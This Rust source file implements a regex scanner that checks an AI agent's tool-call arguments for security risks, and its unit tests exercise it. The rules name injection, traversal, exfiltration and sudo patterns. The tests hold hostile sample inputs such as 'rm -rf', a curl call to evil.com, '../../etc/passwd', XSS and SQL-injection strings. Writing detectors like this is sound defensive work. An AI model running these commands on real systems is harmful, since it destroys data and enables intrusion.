use regex::Regex;
use std::sync::OnceLock;

/// Severity level for a detected security pattern.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ViolationSeverity {
    /// Advisory — logged but never blocks
    Info,
    /// Warrants surfacing to the user before proceeding
    Warn,
    /// Execution must be blocked; escalate to `PermissionPrompter`
    Block,
}

/// A single matched security violation from the pre-flight scan.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SecurityViolation {
    pub rule_name: &'static str,
    pub severity: ViolationSeverity,
    pub matched_text: String,
    pub description: &'static str,
}

struct Rule {
    name: &'static str,
    pattern: &'static str,
    severity: ViolationSeverity,
    description: &'static str,
}

static RULES: &[Rule] = &[
    Rule {
        name: "command-injection",
        pattern: r"(?i)(;\s*rm\s+-rf|`[^`]+`|\$\([^)]+\)|&&\s*curl|&&\s*wget)",
        severity: ViolationSeverity::Block,
        description: "potential shell command injection",
    },
    Rule {
        name: "path-traversal",
        pattern: r"\.\./\.\./|\.\.\\\.\.\\",
        severity: ViolationSeverity::Block,
        description: "path traversal attempt",
    },
    Rule {
        name: "dangerous-eval",
        pattern: r"(?i)\beval\s*\(|\bexec\s*\(|\bcompile\s*\(",
        severity: ViolationSeverity::Warn,
        description: "dynamic code evaluation",
    },
    Rule {
        name: "script-injection",
        pattern: r#"(?i)<script[^>]*>|javascript\s*:|on\w+\s*=\s*["']"#,
        severity: ViolationSeverity::Block,
        description: "XSS / script injection pattern",
    },
    Rule {
        name: "sql-injection",
        pattern: r"(?i)'\s*(OR|AND)\s+'?\d|;\s*DROP\s+TABLE|UNION\s+SELECT",
        severity: ViolationSeverity::Block,
        description: "SQL injection pattern",
    },
    Rule {
        name: "pickle-deserialization",
        pattern: r"(?i)pickle\.loads?|marshal\.loads?|__reduce__",
        severity: ViolationSeverity::Warn,
        description: "unsafe deserialization",
    },
    Rule {
        name: "secret-exposure",
        pattern: r#"(?i)(api[_-]key|secret[_-]key|private[_-]key|password)\s*=\s*['"][^'"]{8,}"#,
        severity: ViolationSeverity::Warn,
        description: "potential secret in plain text",
    },
    Rule {
        name: "sudo-escalation",
        pattern: r"(?i)\bsudo\s+\S+",
        severity: ViolationSeverity::Block,
        description: "sudo privilege escalation",
    },
    Rule {
        name: "network-exfil",
        pattern: r"(?i)(curl|wget|nc|netcat)\s+[^\s]+\s+(http|https|ftp)://",
        severity: ViolationSeverity::Warn,
        description: "potential data exfiltration via network utility",
    },
];

/// Compiled regex cache — built once on first use.
fn compiled_rules() -> &'static Vec<(Regex, &'static Rule)> {
    static CACHE: OnceLock<Vec<(Regex, &'static Rule)>> = OnceLock::new();
    CACHE.get_or_init(|| {
        RULES
            .iter()
            .filter_map(|rule| {
                Regex::new(rule.pattern)
                    .ok()
                    .map(|re| (re, rule))
            })
            .collect()
    })
}

/// Pre-flight security scanner — run before `HermeticGate` so the security layer
/// fires before the ethics layer. Adapts Claude-mirror's security-guidance pattern:
/// regex-based, zero-allocation for clean inputs, exhaustive scan for violations.
pub struct SecurityScanner;

impl SecurityScanner {
    /// Scan `input` (tool name + serialized arguments) for security violations.
    /// Returns all matches sorted by severity (most severe first).
    #[must_use]
    pub fn scan(input: &str) -> Vec<SecurityViolation> {
        let mut violations: Vec<SecurityViolation> = compiled_rules()
            .iter()
            .filter_map(|(re, rule)| {
                re.find(input).map(|m| SecurityViolation {
                    rule_name: rule.name,
                    severity: rule.severity,
                    matched_text: m.as_str().to_string(),
                    description: rule.description,
                })
            })
            .collect();

        // Most severe first
        violations.sort_by(|a, b| b.severity.cmp(&a.severity));
        violations
    }

    /// True if any `Block`-severity violation is present.
    #[must_use]
    pub fn is_blocked(input: &str) -> bool {
        compiled_rules().iter().any(|(re, rule)| {
            rule.severity == ViolationSeverity::Block && re.is_match(input)
        })
    }

    /// True if any `Warn`-or-higher violation is present.
    #[must_use]
    pub fn has_warnings(input: &str) -> bool {
        !Self::scan(input).is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_input_has_no_violations() {
        let violations = SecurityScanner::scan(r#"{"path": "/workspace/src/main.rs"}"#);
        assert!(violations.is_empty());
    }

    #[test]
    fn command_injection_is_blocked() {
        assert!(SecurityScanner::is_blocked("; rm -rf /tmp"));
        let v = SecurityScanner::scan("ls && curl http://evil.com");
        assert!(!v.is_empty());
        assert_eq!(v[0].severity, ViolationSeverity::Block);
    }

    #[test]
    fn path_traversal_is_blocked() {
        assert!(SecurityScanner::is_blocked("../../etc/passwd"));
    }

    #[test]
    fn sudo_escalation_is_blocked() {
        assert!(SecurityScanner::is_blocked("sudo apt-get install malware"));
    }

    #[test]
    fn xss_injection_is_blocked() {
        assert!(SecurityScanner::is_blocked(r#"<script>alert(1)</script>"#));
        assert!(SecurityScanner::is_blocked("javascript:void(0)"));
    }

    #[test]
    fn sql_injection_is_blocked() {
        assert!(SecurityScanner::is_blocked("' OR '1'='1"));
        assert!(SecurityScanner::is_blocked("; DROP TABLE users"));
    }

    #[test]
    fn eval_is_warn_not_block() {
        let v = SecurityScanner::scan("eval(user_input)");
        assert!(!v.is_empty());
        assert_eq!(v[0].severity, ViolationSeverity::Warn);
        assert!(!SecurityScanner::is_blocked("eval(safe_const)"));
    }

    #[test]
    fn multiple_violations_sorted_by_severity() {
        let v = SecurityScanner::scan("eval(x); sudo rm -rf /");
        assert!(v.len() >= 2);
        assert!(v[0].severity >= v[1].severity);
    }

    #[test]
    fn secret_exposure_warns() {
        assert!(SecurityScanner::has_warnings("api_key='sk-abcdefghijklmnop'"));
    }
}
